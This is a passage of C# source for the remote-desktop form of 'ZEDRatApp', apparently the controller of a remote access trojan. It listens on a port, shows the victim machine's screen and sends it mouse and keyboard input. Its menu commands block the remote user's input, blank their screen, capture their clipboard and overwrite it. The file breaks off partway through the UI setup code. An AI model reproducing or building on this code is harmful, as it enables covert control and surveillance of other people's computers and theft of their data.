using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;
using Siticone.Desktop.UI.WinForms;

using Sockets;
using ZEDRAT.TCP;
using ZEDRatApp.Forms.Controls;
using ZEDRatApp.Properties;
using ZEDRatApp.ZEDRAT.Enum;
using ZEDRatApp.ZEDRAT.Helper;
using ZEDRatApp.ZEDRAT.MouseKeyHook;
using ZEDRatApp.ZEDRAT.Utilities;

namespace ZEDRatApp.Forms
{
	public class Remote_Desk : Form
	{
		private CancellationTokenSource source = new CancellationTokenSource();

		private TcpClientSession _tcs;

		private string _tital;

		private int Network_Traffic;

		private RemoteDesktopTcpServer rdts;

		private int RecvBytes;

		private Task statusbar;

		private UnsafeStreamCodec StreamCodec;

		private bool _enableMouseInput = true;

		private bool _enableKeyboardInput = true;

		private IKeyboardMouseEvents _keyboardHook;

		private IKeyboardMouseEvents _mouseHook;

		private List<Keys> _keysPressed;

		private string _clipboardText = "";

		private Remote_GetClipboard frmClipboard;

		private Point formPoint;

		private bool formMove;

		private IContainer components;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private BunifuSeparator bunifuSeparator1;

		private BunifuSeparator bunifuSeparator2;

		private SiticoneHtmlLabel label1;

		private Guna2ControlBox guna2ControlBox1;

		private Guna2Panel guna2Panel1;

		private Guna2ContextMenuStrip guna2ContextMenuStrip1;

		internal ToolStripMenuItem controlToolStripMenuItem;

		internal ToolStripMenuItem blockInputToolStripMenuItem;

		internal ToolStripMenuItem blankScreenToolStripMenuItem;

		internal ToolStripMenuItem saveDIBToolStripMenuItem;

		internal ToolStripMenuItem getClipboardToolStripMenuItem;

		internal ToolStripMenuItem toolStripMenuItem;

		private SiticoneHtmlLabel lblQualityShow;

		private SiticoneHtmlLabel SiticoneHtmlLabel2;

		private Guna2TrackBar barQuality;

		private SiticoneRoundedButton btnStop;

		private BunifuToolTip bunifuToolTip1;

		private SiticoneRoundedButton btnStart;

		private Guna2PictureBox guna2PictureBox6;

		private Guna2PictureBox guna2PictureBox5;

		private Guna2ShadowForm guna2ShadowForm1;

		private BunifuIconButton CloseBtn;

		private Guna2PictureBox guna2PictureBox4;

		private Guna2PictureBox guna2PictureBox3;

		private Guna2PictureBox guna2PictureBox2;

		public RapidPictureBox picDesktop;

		public Remote_Desk(string tital, TcpClientSession tcs)
		{
			this.InitializeComponent();
			this._tcs = tcs;
			this._tital = tital;
			this.Text = this._tital;
		}

		private void Remote_Desk_Load(object sender, EventArgs e)
		{
			try
			{
				this.SubscribeEvents();
				this._tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("Start"));
				this.rdts = new RemoteDesktopTcpServer(1313);
				this.rdts._ClientMessage = new Action<byte[]>(UpdateRemoteDesktop_Image);
				this.rdts.Listen();
				this.statusbar = Task.Factory.StartNew((Func<Task>)async delegate
				{
					await this.UpdateStatusBar();
				}, TaskCreationOptions.LongRunning);
				this._keysPressed = new List<Keys>();
				this.picDesktop.Start();
			}
			catch
			{
			}
		}

		private void SubscribeEvents()
		{
			if (PlatformHelper.RunningOnMono)
			{
				base.KeyDown += new KeyEventHandler(OnKeyDown);
				base.KeyUp += new KeyEventHandler(OnKeyUp);
				return;
			}
			this._keyboardHook = Hook.GlobalEvents();
			this._keyboardHook.KeyDown += new KeyEventHandler(OnKeyDown);
			this._keyboardHook.KeyUp += new KeyEventHandler(OnKeyUp);
			this._mouseHook = Hook.AppEvents();
			this._mouseHook.MouseWheel += new MouseEventHandler(OnMouseWheelMove);
		}

		private void UnsubscribeEvents()
		{
			if (PlatformHelper.RunningOnMono)
			{
				base.KeyDown -= new KeyEventHandler(OnKeyDown);
				base.KeyUp -= new KeyEventHandler(OnKeyUp);
				return;
			}
			if (this._keyboardHook != null)
			{
				this._keyboardHook.KeyDown -= new KeyEventHandler(OnKeyDown);
				this._keyboardHook.KeyUp -= new KeyEventHandler(OnKeyUp);
				this._keyboardHook.Dispose();
			}
			if (this._mouseHook != null)
			{
				this._mouseHook.MouseWheel -= new MouseEventHandler(OnMouseWheelMove);
				this._mouseHook.Dispose();
			}
		}

		private int GetRemoteWidth(int localX)
		{
			return localX * this.picDesktop.ScreenWidth / this.picDesktop.Width;
		}

		private int GetRemoteHeight(int localY)
		{
			return localY * this.picDesktop.ScreenHeight / this.picDesktop.Height;
		}

		private void btnMini_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		private void btnMaxi_Click(object sender, EventArgs e)
		{
			if (base.WindowState == FormWindowState.Normal)
			{
				this.Remote_Desk_Maximize();
			}
			else if (base.WindowState == FormWindowState.Maximized)
			{
				this.Remote_Desk_Restore();
			}
		}

		private void btnClose_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		private void panelTitleBar_MouseDown(object sender, MouseEventArgs e)
		{
			this.formPoint = default(Point);
			if (e.Button == MouseButtons.Left)
			{
				this.formPoint = new Point(-e.X - SystemInformation.FrameBorderSize.Width, -e.Y - SystemInformation.CaptionHeight - SystemInformation.FrameBorderSize.Height);
				this.formMove = true;
			}
		}

		private void panelTitleBar_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.formMove)
			{
				base.Location = Control.MousePosition;
			}
		}

		private void panelTitleBar_MouseUp(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				this.formMove = false;
			}
		}

		private void picDesktop_MouseDown(object sender, MouseEventArgs e)
		{
			if (this.picDesktop.Image != null && this._enableMouseInput && this.controlToolStripMenuItem.Checked && base.ContainsFocus)
			{
				int localX = e.X;
				int localY = e.Y;
				int remoteWidth = this.GetRemoteWidth(localX);
				int remoteHeight = this.GetRemoteHeight(localY);
				MouseAction mouseAction = MouseAction.None;
				if (e.Button == MouseButtons.Left)
				{
					mouseAction = MouseAction.LeftDown;
				}
				if (e.Button == MouseButtons.Right)
				{
					mouseAction = MouseAction.RightDown;
				}
				int num = 0;
				this._tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("action_mouse:" + mouseAction.ToString() + ",press:" + true + ",remote_x:" + remoteWidth + ",remote_y:" + remoteHeight + ",moniter:" + num));
			}
		}

		private void picDesktop_MouseUp(object sender, MouseEventArgs e)
		{
			if (this.picDesktop.Image != null && this._enableMouseInput && this.controlToolStripMenuItem.Checked && base.ContainsFocus)
			{
				int localX = e.X;
				int localY = e.Y;
				int remoteWidth = this.GetRemoteWidth(localX);
				int remoteHeight = this.GetRemoteHeight(localY);
				MouseAction mouseAction = MouseAction.None;
				if (e.Button == MouseButtons.Left)
				{
					mouseAction = MouseAction.LeftDown;
				}
				if (e.Button == MouseButtons.Right)
				{
					mouseAction = MouseAction.RightDown;
				}
				int num = 0;
				this._tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("action_mouse:" + mouseAction.ToString() + ",press:" + false + ",remote_x:" + remoteWidth + ",remote_y:" + remoteHeight + ",moniter:" + num));
			}
		}

		private void picDesktop_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.picDesktop.Image != null && this._enableMouseInput && this.controlToolStripMenuItem.Checked && base.ContainsFocus)
			{
				int localX = e.X;
				int localY = e.Y;
				int remoteWidth = this.GetRemoteWidth(localX);
				int remoteHeight = this.GetRemoteHeight(localY);
				int num = 0;
				this._tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("action_mouse:" + MouseAction.MoveCursor.ToString() + ",press:" + false + ",remote_x:" + remoteWidth + ",remote_y:" + remoteHeight + ",moniter:" + num));
			}
		}

		private void OnMouseWheelMove(object sender, MouseEventArgs e)
		{
			if (this.picDesktop.Image != null && this._enableMouseInput && this.controlToolStripMenuItem.Checked && base.ContainsFocus)
			{
				int localX = e.X;
				int localY = e.Y;
				int remoteWidth = this.GetRemoteWidth(localX);
				int remoteHeight = this.GetRemoteHeight(localY);
				this._tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("action_mouse:" + ((e.Delta == 120) ? MouseAction.ScrollUp : MouseAction.ScrollDown).ToString() + ",press:" + false + ",remote_x:" + remoteWidth + ",remote_y:" + remoteHeight + ",moniter:" + 0));
			}
		}

		private void OnKeyDown(object sender, KeyEventArgs e)
		{
			if (this.picDesktop.Image != null && this._enableKeyboardInput && this.controlToolStripMenuItem.Checked && base.ContainsFocus)
			{
				if (!this.IsLockKey(e.KeyCode))
				{
					e.Handled = true;
				}
				if (!this._keysPressed.Contains(e.KeyCode))
				{
					this._keysPressed.Add(e.KeyCode);
					this._tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("keyboard_mouse:" + (byte)e.KeyCode + ",press:" + true));
				}
			}
		}

		private void OnKeyUp(object sender, KeyEventArgs e)
		{
			if (this.picDesktop.Image != null && this._enableKeyboardInput && this.controlToolStripMenuItem.Checked && base.ContainsFocus)
			{
				if (!this.IsLockKey(e.KeyCode))
				{
					e.Handled = true;
				}
				this._keysPressed.Remove(e.KeyCode);
				this._tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("keyboard_mouse:" + (byte)e.KeyCode + ",press:" + false));
			}
		}

		private bool IsLockKey(Keys key)
		{
			if ((key & Keys.Capital) != Keys.Capital && (key & Keys.NumLock) != Keys.NumLock)
			{
				return (key & Keys.Scroll) == Keys.Scroll;
			}
			return true;
		}

		public static string FormatScreenResolution(Rectangle resolution)
		{
			return $"{resolution.Width}x{resolution.Height}";
		}

		public static Rectangle GetBounds(int screenNumber)
		{
			return Screen.AllScreens[screenNumber].Bounds;
		}

		public async Task UpdateStatusBar()
		{
			Remote_Desk remoteDesktop = this;
			while (!remoteDesktop.source.IsCancellationRequested)
			{
				await Task.Delay(1000);
				remoteDesktop.Network_Traffic += remoteDesktop.RecvBytes;
				remoteDesktop.Text = remoteDesktop._tital + "   Download Speed: " + remoteDesktop.RecvBytes / 1024 + " KB    Downloaded Traffic: " + remoteDesktop.GetFileSize(remoteDesktop.Network_Traffic);
				remoteDesktop.RecvBytes = 0;
			}
		}

		public void SendClipboard(string strClipboard)
		{
			this._tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("ClipboardText:" + strClipboard));
		}

		private void Remote_Desk_Maximize()
		{
			base.WindowState = FormWindowState.Maximized;
			this.picDesktop.Location = new Point(0, 26);
			this.picDesktop.Size = new Size(1920, 1054);
		}

		private void Remote_Desk_Restore()
		{
			base.WindowState = FormWindowState.Normal;
			this.picDesktop.Location = new Point(0, 26);
			this.picDesktop.Size = new Size(1000, 564);
		}

		private void Remote_Desk_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				if (this.statusbar != null)
				{
					if (!this.statusbar.IsCompleted)
					{
						this.source.Cancel();
					}
					this.statusbar.Dispose();
				}
				this.source.Dispose();
				this.rdts?.Close();
				this._tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("Stop"));
				this.UnsubscribeEvents();
			}
			catch
			{
			}
			finally
			{
				this.statusbar = null;
				this.source = null;
				this.rdts = null;
				this._tcs = null;
			}
		}

		private void UpdateRemoteDesktop_Image(byte[] message)
		{
			try
			{
				if (this.StreamCodec == null)
				{
					this.StreamCodec = new UnsafeStreamCodec(Convert.ToInt32(((Control)(object)this.lblQualityShow).Text), 0, "1920x1080");
				}
				if (Encoding.UTF8.GetString(message).Contains("BlockInput:Fail"))
				{
					base.Invoke((MethodInvoker)delegate
					{
						MessageBox.Show("Block input function failed, you need to use administrator privileges");
					});
				}
				else if (Encoding.UTF8.GetString(message).Contains("Clipboard:"))
				{
					base.Invoke((MethodInvoker)delegate
					{
						string @string = Encoding.UTF8.GetString(message);
						if (this._clipboardText != @string)
						{
							this._clipboardText = @string;
						}
						if ((Remote_GetClipboard)Application.OpenForms["Remote GetClipboard"] == null)
						{
							this.frmClipboard = new Remote_GetClipboard();
							this.frmClipboard.Name = "Remote GetClipboard";
							this.frmClipboard.Show();
						}
						else
						{
							string text = this._clipboardText.Substring(10);
							if (text.Length > 0 && !this.frmClipboard.IsOldClipboard(text))
							{
								this.frmClipboard.AddClipboard(text);
								this.frmClipboard.Show();
							}
						}
					});
				}
				else
				{
					using MemoryStream inStream = new MemoryStream(message);
					this.UpdataPictureBox(this.StreamCodec.DecodeData(inStream));
				}
				this.RecvBytes += message.Length + 4;
			}
			catch
			{
			}
		}

		private void UpdataPictureBox(Image returnImage)
		{
			if (this.picDesktop.InvokeRequired)
			{
				this.picDesktop.Invoke((MethodInvoker)delegate
				{
					this.picDesktop.UpdateImage(new Bitmap(returnImage), cloneBitmap: true);
				});
			}
			else
			{
				this.picDesktop.Image = returnImage;
			}
		}

		private string GetFileSize(double size)
		{
			try
			{
				if (size >= 0.0 && size < 1024.0)
				{
					return size + " Bytes";
				}
				double num = size / 1024.0;
				if (num >= 1.0 && num < 1024.0)
				{
					return num.ToString("#.0") + " KB";
				}
				double num2 = size / 1048576.0;
				if (num2 >= 1.0 && num2 < 1024.0)
				{
					return num2.ToString("#.0") + " MB";
				}
				double num3 = size / 1073741824.0;
				return (num3 >= 1.0) ? (num3.ToString("#.0") + " GB") : null;
			}
			catch
			{
				return null;
			}
		}

		private void controlToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.controlToolStripMenuItem.Checked = !this.controlToolStripMenuItem.Checked;
			if (!this.controlToolStripMenuItem.Checked)
			{
				this.controlToolStripMenuItem.CheckState = CheckState.Checked;
			}
			else
			{
				this.controlToolStripMenuItem.CheckState = CheckState.Unchecked;
			}
		}

		private void blockInputToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.blockInputToolStripMenuItem.Checked = !this.blockInputToolStripMenuItem.Checked;
			if (!this.blockInputToolStripMenuItem.Checked)
			{
				this.blockInputToolStripMenuItem.CheckState = CheckState.Checked;
				this._tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("BlockInput:Enable"));
			}
			else
			{
				this.blockInputToolStripMenuItem.CheckState = CheckState.Unchecked;
				this._tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("BlockInput:Disable"));
			}
		}

		private void blankScreenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.blankScreenToolStripMenuItem.Checked = !this.blankScreenToolStripMenuItem.Checked;
			if (!this.blankScreenToolStripMenuItem.Checked)
			{
				this.blankScreenToolStripMenuItem.CheckState = CheckState.Checked;
				this._tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("BlankScreen:Enable"));
			}
			else
			{
				this.blankScreenToolStripMenuItem.CheckState = CheckState.Unchecked;
				this._tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("BlankScreen:Disable"));
			}
		}

		private void saveDIBToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				using SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.RestoreDirectory = true;
				saveFileDialog.Title = "Save Image File";
				saveFileDialog.DefaultExt = "png";
				saveFileDialog.Filter = "image files (*.png)|*.png|All files (*.*)|*.*";
				saveFileDialog.FilterIndex = 2;
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					string fileName = saveFileDialog.FileName;
					this.picDesktop.Image.Save(fileName);
				}
			}
			catch (Exception)
			{
				MessageBox.Show("Can't save image file");
			}
		}

		private void toolStripMenuItem_Click(object sender, EventArgs e)
		{
			new Remote_SetClipboard(this).ShowDialog();
		}

		private void getClipboardToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.getClipboardToolStripMenuItem.Checked = !this.getClipboardToolStripMenuItem.Checked;
			if (!this.getClipboardToolStripMenuItem.Checked)
			{
				this.getClipboardToolStripMenuItem.CheckState = CheckState.Checked;
				this._tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("GetClipboard:Enable"));
			}
			else
			{
				this.getClipboardToolStripMenuItem.CheckState = CheckState.Unchecked;
				this._tcs?.Client_Send(DataType.RemoteDesktopType, Encoding.UTF8.GetBytes("GetClipboard:Disable"));
			}
		}

		private void guna2TrackBar1_Scroll(object sender, ScrollEventArgs e)
		{
			int value = this.barQuality.Value;
			((Control)(object)this.lblQualityShow).Text = value.ToString();
			if (value < 25)
			{
				((Control)(object)this.lblQualityShow).Text += " (low)";
			}
			else if (value >= 85)
			{
				((Control)(object)this.lblQualityShow).Text += " (best)";
			}
			else if (value >= 75)
			{
				((Control)(object)this.lblQualityShow).Text += " (high)";
			}
			else if (value >= 25)
			{
				((Control)(object)this.lblQualityShow).Text += " (mid)";
			}
			base.ActiveControl = this.picDesktop;
		}

		private void btnStart_Click(object sender, EventArgs e)
		{
			this.controlToolStripMenuItem.CheckState = CheckState.Checked;
			this.barQuality.Enabled = false;
		}

		private void btnStop_Click(object sender, EventArgs e)
		{
			this.controlToolStripMenuItem.CheckState = CheckState.Unchecked;
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
																																	this.components = new System.ComponentModel.Container();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ZEDRatApp.Forms.Remote_Desk));
			this.guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.bunifuSeparator1 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator2 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.label1 = new SiticoneHtmlLabel();
			this.guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
			this.guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
			this.picDesktop = new ZEDRatApp.Forms.Controls.RapidPictureBox();
			this.guna2ContextMenuStrip1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
			this.controlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.blockInputToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.blankScreenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.saveDIBToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.toolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.getClipboardToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.SiticoneHtmlLabel2 = new SiticoneHtmlLabel();
			this.lblQualityShow = new SiticoneHtmlLabel();
			this.barQuality = new Guna.UI2.WinForms.Guna2TrackBar();
			this.btnStart = new SiticoneRoundedButton();
			this.btnStop = new SiticoneRoundedButton();
			this.bunifuToolTip1 = new Bunifu.UI.WinForms.BunifuToolTip(this.components);
			this.guna2PictureBox5 = new Guna.UI2.WinForms.Guna2PictureBox();
			this.guna2PictureBox6 = new Guna.UI2.WinForms.Guna2PictureBox();
			this.CloseBtn = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.guna2PictureBox4 = new Guna.UI2.WinForms.Guna2PictureBox();
			this.guna2PictureBox3 = new Guna.UI2.WinForms.Guna2PictureBox();
			this.guna2PictureBox2 = new Guna.UI2.WinForms.Guna2PictureBox();
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			this.guna2Panel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)this.picDesktop).BeginInit();
			this.guna2ContextMenuStrip1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)this.guna2PictureBox5).BeginInit();
			((System.ComponentModel.ISupportInitialize)this.guna2PictureBox6).BeginInit();
			((System.ComponentModel.ISupportInitialize)this.guna2PictureBox4).BeginInit();
			((System.ComponentModel.ISupportInitialize)this.guna2PictureBox3).BeginInit();
			((System.ComponentModel.ISupportInitialize)this.guna2PictureBox2).BeginInit();
			base.SuspendLayout();
			this.guna2BorderlessForm1.ContainerControl = this;
			this.bunifuSeparator1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator1.BackgroundImage");
			this.bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator1.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator1.LineColor = System.Drawing.Color.DimGray;
			this.bunifuSeparator1.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator1.LineThickness = 1;
			this.bunifuSeparator1.Location = new System.Drawing.Point(-2, 544);
			this.bunifuSeparator1.Margin = new System.Windows.Forms.Padding(6, 2, 6, 2);
			this.bunifuSeparator1.Name = "bunifuSeparator1";
			this.bunifuSeparator1.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator1.Size = new System.Drawing.Size(1202, 12);
			this.bunifuSeparator1.TabIndex = 107;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator1, "");
			this.bunifuSeparator2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator2.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator2.BackgroundImage");
			this.bunifuSeparator2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator2.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator2.LineColor = System.Drawing.Color.DimGray;
			this.bunifuSeparator2.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator2.LineThickness = 1;
			this.bunifuSeparator2.Location = new System.Drawing.Point(-2, 73);
			this.bunifuSeparator2.Margin = new System.Windows.Forms.Padding(6, 2, 6, 2);
			this.bunifuSeparator2.Name = "bunifuSeparator2";
			this.bunifuSeparator2.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator2.Size = new System.Drawing.Size(1202, 13);
			this.bunifuSeparator2.TabIndex = 104;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator2, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator2, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator2, "");
			((System.Windows.Forms.Control)(object)this.label1).BackColor = System.Drawing.Color.Transparent;
			this.label1.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.label1.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.label1).Location = new System.Drawing.Point(72, 43);
			((System.Windows.Forms.Control)(object)this.label1).Margin = new System.Windows.Forms.Padding(4);
			((System.Windows.Forms.Control)(object)this.label1).Name = "label1";
			((System.Windows.Forms.Control)(object)this.label1).Size = new System.Drawing.Size(133, 23);
			((System.Windows.Forms.Control)(object)this.label1).TabIndex = 103;
			((System.Windows.Forms.Control)(object)this.label1).Text = "Remote Desktop";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.label1, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.label1, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.label1, "");
			this.guna2ControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.guna2ControlBox1.BorderColor = System.Drawing.Color.DarkGray;
			this.guna2ControlBox1.BorderRadius = 12;
			this.guna2ControlBox1.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ControlBox1.HoverState.Parent = this.guna2ControlBox1;
			this.guna2ControlBox1.IconColor = System.Drawing.Color.Black;
			this.guna2ControlBox1.Location = new System.Drawing.Point(1124, 15);
			this.guna2ControlBox1.Margin = new System.Windows.Forms.Padding(4);
			this.guna2ControlBox1.Name = "guna2ControlBox1";
			this.guna2ControlBox1.ShadowDecoration.Parent = this.guna2ControlBox1;
			this.guna2ControlBox1.Size = new System.Drawing.Size(60, 38);
			this.guna2ControlBox1.TabIndex = 101;
			this.bunifuToolTip1.SetToolTip(this.guna2ControlBox1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.guna2ControlBox1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.guna2ControlBox1, "");
			this.guna2Panel1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.guna2Panel1.Controls.Add(this.picDesktop);
			this.guna2Panel1.Location = new System.Drawing.Point(-2, 80);
			this.guna2Panel1.Margin = new System.Windows.Forms.Padding(4);
			this.guna2Panel1.Name = "guna2Panel1";
			this.guna2Panel1.ShadowDecoration.Parent = this.guna2Panel1;
			this.guna2Panel1.Size = new System.Drawing.Size(1202, 635);
			this.guna2Panel1.TabIndex = 116;
			this.bunifuToolTip1.SetToolTip(this.guna2Panel1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.guna2Panel1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.guna2Panel1, "");
			this.picDesktop.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.picDesktop.GetImageSafe = null;
			this.picDesktop.Location = new System.Drawing.Point(0, 0);
			this.picDesktop.Margin = new System.Windows.Forms.Padding(4);
			this.picDesktop.Name = "picDesktop";
			this.picDesktop.Running = false;
			this.picDesktop.Size = new System.Drawing.Size(1202, 635);
			this.picDesktop.TabIndex = 0;
			this.picDesktop.TabStop = false;
			this.bunifuToolTip1.SetToolTip(this.picDesktop, "");
			this.bunifuToolTip1.SetToolTipIcon(this.picDesktop, null);
			this.bunifuToolTip1.SetToolTipTitle(this.picDesktop, "");
			this.picDesktop.MouseDown += new System.Windows.Forms.MouseEventHandler(picDesktop_MouseDown);
			this.picDesktop.MouseMove += new System.Windows.Forms.MouseEventHandler(picDesktop_MouseMove);
			this.picDesktop.MouseUp += new System.Windows.Forms.MouseEventHandler(picDesktop_MouseUp);
			this.guna2ContextMenuStrip1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.guna2ContextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.controlToolStripMenuItem, this.blockInputToolStripMenuItem, this.blankScreenToolStripMenuItem, this.saveDIBToolStripMenuItem, this.toolStripMenuItem, this.getClipboardToolStripMenuItem });
			this.guna2ContextMenuStrip1.Name = "guna2ContextMenuStrip1";
			this.guna2ContextMenuStrip1.RenderStyle.ArrowColor = System.Drawing.Color.White;
			this.guna2ContextMenuStrip1.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.guna2ContextMenuStrip1.RenderStyle.ColorTable = null;
			this.guna2ContextMenuStrip1.RenderStyle.RoundedEdges = true;
			this.guna2ContextMenuStrip1.RenderStyle.SelectionArrowColor = System.Drawing.Color.Black;
			this.guna2ContextMenuStrip1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ContextMenuStrip1.RenderStyle.SelectionForeColor = System.Drawing.Color.Black;
			this.guna2ContextMenuStrip1.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
			this.guna2ContextMenuStrip1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
			this.guna2ContextMenuStrip1.Size = new System.Drawing.Size(161, 136);
			this.bunifuToolTip1.SetToolTip(this.guna2ContextMenuStrip1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.guna2ContextMenuStrip1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.guna2ContextMenuStrip1, "");
			this.controlToolStripMenuItem.CheckOnClick = true;
			this.controlToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.controlToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("controlToolStripMenuItem.Image");
			this.controlToolStripMenuItem.Name = "controlToolStripMenuItem";
			this.controlToolStripMenuItem.Size = new System.Drawing.Size(160, 22);
			this.controlToolStripMenuItem.Text = "Control";
			this.controlToolStripMenuItem.Click += new System.EventHandler(controlToolStripMenuItem_Click);
			this.blockInputToolStripMenuItem.CheckOnClick = true;
			this.blockInputToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.blockInputToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("blockInputToolStripMenuItem.Image");
			this.blockInputToolStripMenuItem.Name = "blockInputToolStripMenuItem";
			this.blockInputToolStripMenuItem.Size = new System.Drawing.Size(160, 22);
			this.blockInputToolStripMenuItem.Text = "BlockInput";
			this.blockInputToolStripMenuItem.Click += new System.EventHandler(blockInputToolStripMenuItem_Click);
			this.blankScreenToolStripMenuItem.CheckOnClick = true;
